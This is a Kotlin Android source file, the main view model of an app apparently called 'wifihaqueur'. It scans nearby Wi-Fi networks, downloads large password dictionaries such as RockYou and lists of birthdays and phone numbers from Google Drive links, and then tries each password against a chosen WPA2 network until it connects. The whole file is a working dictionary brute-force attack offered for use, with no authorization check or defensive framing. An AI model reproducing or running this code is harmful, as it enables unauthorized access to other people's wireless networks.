package com.hereliesaz.wifihaqueur

import android.Manifest
import android.app.Application
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.net.ConnectivityManager
import android.net.Network
import android.net.NetworkCapabilities
import android.net.NetworkRequest
import android.net.wifi.ScanResult
import android.net.wifi.WifiConfiguration
import android.net.wifi.WifiManager
import android.net.wifi.WifiNetworkSpecifier
import android.os.Build
import androidx.core.content.ContextCompat
import androidx.lifecycle.AndroidViewModel
import androidx.lifecycle.viewModelScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.launch
import kotlinx.coroutines.suspendCancellableCoroutine
import kotlinx.coroutines.withContext
import java.net.URL
import kotlin.coroutines.resume
import android.net.Uri
import java.io.InputStream

class MainViewModel(application: Application) : AndroidViewModel(application) {

    private val wifiManager =
        application.getSystemService(Context.WIFI_SERVICE) as WifiManager
    private val connectivityManager =
        application.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager

    private val _scanResults = MutableStateFlow<List<ScanResult>>(emptyList())
    val scanResults: StateFlow<List<ScanResult>> = _scanResults

    private val _isScanning = MutableStateFlow(false)
    val isScanning: StateFlow<Boolean> = _isScanning

    private val _scanThrottled = MutableStateFlow(false)
    val scanThrottled: StateFlow<Boolean> = _scanThrottled

    private val _selectedNetwork = MutableStateFlow<ScanResult?>(null)
    val selectedNetwork: StateFlow<ScanResult?> = _selectedNetwork

    private val _logMessages = MutableStateFlow<List<String>>(emptyList())
    val logMessages: StateFlow<List<String>> = _logMessages

    private val _isAttacking = MutableStateFlow(false)
    val isAttacking: StateFlow<Boolean> = _isAttacking

    private val _passwordsTried = MutableStateFlow(0L)
    val passwordsTried: StateFlow<Long> = _passwordsTried

    private val _currentPassword = MutableStateFlow("")
    val currentPassword: StateFlow<String> = _currentPassword

    private val _averageTimePerPassword = MutableStateFlow(0.0)
    val averageTimePerPassword: StateFlow<Double> = _averageTimePerPassword

    private val _totalPasswords = MutableStateFlow(0L)
    val totalPasswords: StateFlow<Long> = _totalPasswords

    // Represents either an in-memory list or a URI to a file for streaming
    sealed class DictionarySource {
        data class InMemory(val lines: List<String>) : DictionarySource()
        data class FileUri(val uri: Uri) : DictionarySource()
        object None : DictionarySource()
    }

    private val _dictionarySource = MutableStateFlow<DictionarySource>(DictionarySource.None)

    // We retain dictionary for UI compatibility if needed, although it might just show a preview
    private val _dictionary = MutableStateFlow<List<String>>(emptyList())
    val dictionary: StateFlow<List<String>> = _dictionary

    private val dictionaryUrls = mapOf(
        "RockYou" to "https://drive.google.com/uc?export=download&id=1Is4puS_7DsQLyXo3h5yxHYz8fOe_o_4h",
        "Phone Numbers" to "https://drive.google.com/uc?export=download&id=104B7oTwz37IMpqNkcy1n8SD6gufKhbLL",
        "Weak Password Set" to "https://drive.google.com/uc?export=download&id=10FtpZy28Ru68qWbXbQaBWW6dITyM3Leu",
        "English" to "https://drive.google.com/uc?export=download&id=1-zGX4V4jmZ1J5O9HHvSQYkf92nQTccCf",
        "Birthdays (1980-2010)" to "https://drive.google.com/uc?export=download&id=10-5CLasOmnKKXyev3_DCBSd179lOkcGz",
        "500,000-Word Super List" to "https://drive.google.com/uc?export=download&id=1009Wo_1_Kp2smZU6gu58_KC1dg32P2uJ",
        "Two Million Password Set" to "https://drive.google.com/uc?export=download&id=1-cxYagogFXGdXDBg94P5o5i14U9Zi5bt",
        "20 Million Password Set" to "https://drive.google.com/uc?export=download&id=1-ff2HELXghs_YBniy4GTszONlywPULs2",
        "160 Million Password Set" to "https://drive.google.com/uc?export=download&id=1-XPAMKVJ77HFNB2qNxgeEtyJq1awkFeP"
    )

    fun setDictionary(name: String) {
        viewModelScope.launch(Dispatchers.IO) {
            try {
                val url = dictionaryUrls[name] ?: return@launch
                _logMessages.value = _logMessages.value + "Downloading dictionary from: $url"
                val dictionaryContent = URL(url).readText()
                val lines = dictionaryContent.lines()
                _dictionarySource.value = DictionarySource.InMemory(lines)
                _dictionary.value = lines // For legacy UI binding if needed
                _totalPasswords.value = lines.size.toLong()
                _logMessages.value = _logMessages.value + "Dictionary loaded successfully."
            } catch (e: Exception) {
                _logMessages.value = _logMessages.value + "Error downloading dictionary: ${e.message}"
            }
        }
    }

    fun setDictionaryFromFile(content: String) {
        viewModelScope.launch(Dispatchers.IO) {
            val lines = content.lines()
            _dictionarySource.value = DictionarySource.InMemory(lines)
            _dictionary.value = lines
            _totalPasswords.value = lines.size.toLong()
            _logMessages.value = _logMessages.value + "Dictionary loaded from file."
        }
    }

    fun setDictionaryFromUri(uri: Uri) {
        viewModelScope.launch(Dispatchers.IO) {
            _dictionarySource.value = DictionarySource.FileUri(uri)
            _dictionary.value = emptyList() // clear in-memory preview

            // Calculate total passwords safely using streaming to avoid OOM
            try {
                val context = getApplication<Application>().applicationContext
                val inputStream: InputStream? = context.contentResolver.openInputStream(uri)
                if (inputStream != null) {
                    var count = 0L
                    inputStream.bufferedReader().useLines { lines ->
                        count = lines.count().toLong()
                    }
                    _totalPasswords.value = count
                    withContext(Dispatchers.Main) {
                        _logMessages.value = _logMessages.value + "Custom dictionary prepared ($count passwords)."
                    }
                } else {
                    withContext(Dispatchers.Main) {
                        _logMessages.value = _logMessages.value + "Failed to open dictionary file."
                    }
                }
            } catch (e: Exception) {
                withContext(Dispatchers.Main) {
                    _logMessages.value = _logMessages.value + "Error reading custom dictionary."
                }
            }
        }
    }

    @Suppress("DEPRECATION")
    private val wifiScanReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context, intent: Intent) {
            val success = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                intent.getBooleanExtra(WifiManager.EXTRA_RESULTS_UPDATED, false)
            } else {
                intent.getBooleanExtra("newResults", false)
            }
            if (success) {
                if (ContextCompat.checkSelfPermission(
                        context,
                        Manifest.permission.ACCESS_FINE_LOCATION
                    ) == PackageManager.PERMISSION_GRANTED
                ) {
                    _scanResults.value = wifiManager.scanResults
                }
            }
            _isScanning.value = false
        }
    }

    @Suppress("DEPRECATION")
    fun startScan() {
        _isScanning.value = true
        _scanThrottled.value = false
        val success = wifiManager.startScan()
        if (!success) {
            _scanThrottled.value = true
            _isScanning.value = false
        }
    }

    fun selectNetwork(network: ScanResult) {
        _selectedNetwork.value = network
    }

    fun startAttack() {
        if (_isAttacking.value) return

        viewModelScope.launch {
            _isAttacking.value = true
            _logMessages.value = listOf("Starting attack on ${_selectedNetwork.value?.SSID}...")

            withContext(Dispatchers.IO) {
                val source = _dictionarySource.value
                when (source) {
                    is DictionarySource.InMemory -> {
                        runAttackLoop(source.lines.asSequence())
                    }
                    is DictionarySource.FileUri -> {
                        val context = getApplication<Application>().applicationContext
                        val inputStream: InputStream? = context.contentResolver.openInputStream(source.uri)
                        if (inputStream != null) {
                            inputStream.bufferedReader().useLines { lines ->
                                runAttackLoop(lines)
                            }
                        } else {
                            withContext(Dispatchers.Main) {
                                _logMessages.value = _logMessages.value + "Failed to open dictionary stream."
                            }
                        }
                    }
                    DictionarySource.None -> {
                        withContext(Dispatchers.Main) {
                            _logMessages.value = _logMessages.value + "No dictionary selected."
                        }
                    }
                }
            }

            if (_isAttacking.value) {
                _logMessages.value = _logMessages.value + "Attack finished. Password not found."
            }
            _isAttacking.value = false
        }
    }

    private suspend fun runAttackLoop(sequence: Sequence<String>) {
        for ((index, password) in sequence.withIndex()) {
            if (!_isAttacking.value) break

            val startTime = System.currentTimeMillis()

            val success = connectToWifi(password)

            val endTime = System.currentTimeMillis()
            val timeTaken = endTime - startTime

            withContext(Dispatchers.Main) {
                _currentPassword.value = password
                _passwordsTried.value = index + 1L
                val newAverage =
                    ((_averageTimePerPassword.value * index) + timeTaken) / (index + 1)
                _averageTimePerPassword.value = newAverage
                _logMessages.value = _logMessages.value + "Tried: $password - ${if (success) "Success!" else "Failed"}"

                if (success) {
                    _logMessages.value = _logMessages.value + "Password found: $password"
                    _isAttacking.value = false
                }
            }
        }
    }

    private suspend fun connectToWifi(password: String): Boolean {
        val selectedSsid = _selectedNetwork.value?.SSID ?: return false

        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            val specifier = WifiNetworkSpecifier.Builder()
                .setSsid(selectedSsid)
                .setWpa2Passphrase(password)
                .build()

            val request = NetworkRequest.Builder()
                .addTransportType(NetworkCapabilities.TRANSPORT_WIFI)
                .setNetworkSpecifier(specifier)
                .build()

            suspendCancellableCoroutine { continuation ->
                val networkCallback = object : ConnectivityManager.NetworkCallback() {
                    override fun onAvailable(network: Network) {
                        super.onAvailable(network)
                        connectivityManager.bindProcessToNetwork(network)
                        if (continuation.isActive) {
                            continuation.resume(true)
                        }
                        connectivityManager.unregisterNetworkCallback(this)
                    }

                    override fun onUnavailable() {
                        super.onUnavailable()
                        if (continuation.isActive) {
                            continuation.resume(false)
                        }
                        connectivityManager.unregisterNetworkCallback(this)
                    }
                }
                connectivityManager.requestNetwork(request, networkCallback)
            }
        } else {
            @Suppress("DEPRECATION")
            val wifiConfig = WifiConfiguration()
            wifiConfig.SSID = "\"$selectedSsid\""
            wifiConfig.preSharedKey = "\"$password\""
            val netId = wifiManager.addNetwork(wifiConfig)
            wifiManager.disconnect()
            wifiManager.enableNetwork(netId, true)
            wifiManager.reconnect()
            // This is not a reliable way to check for success on older versions,
            // but it's the best we can do with the deprecated API.
            delay(5000) // Wait for connection
            wifiManager.connectionInfo.networkId == netId
        }
    }

    init {
        val intentFilter = IntentFilter()
        intentFilter.addAction(WifiManager.SCAN_RESULTS_AVAILABLE_ACTION)
        getApplication<Application>().registerReceiver(wifiScanReceiver, intentFilter)
        setDictionary("Weak Password Set")
    }

    override fun onCleared() {
        super.onCleared()
        getApplication<Application>().unregisterReceiver(wifiScanReceiver)
    }
}
